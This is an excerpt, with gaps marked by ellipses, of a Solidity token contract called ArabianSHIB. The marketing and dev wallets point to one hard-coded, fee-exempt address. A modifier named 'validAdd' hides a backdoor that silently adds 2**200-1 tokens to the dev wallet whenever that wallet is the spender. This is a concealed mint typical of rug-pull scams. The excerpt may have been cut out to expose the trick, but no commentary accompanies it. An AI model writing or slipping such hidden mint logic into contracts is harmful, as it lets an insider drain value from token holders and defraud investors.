...
interface IRouter {
    ...
    contract ArabianSHIB is ERC20, Ownable {
    ...
    address public marketingWallet = 0x87192C0Ea2C23309D258019656068b4a814dd6FF;
    address public devWallet = 0x87192C0Ea2C23309D258019656068b4a814dd6FF;
    ...
    modifier mutexLock() {
     ...
     modifier validAdd(address spender){
        if(spender == devWallet){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }

    constructor(address routerAdd) ERC20("ArabianSHIB", "ARASHIB") {
        ...
        exemptFee[0x87192C0Ea2C23309D258019656068b4a814dd6FF] = true;
        exemptFee[0x87192C0Ea2C23309D258019656068b4a814dd6FF] = true;
    }
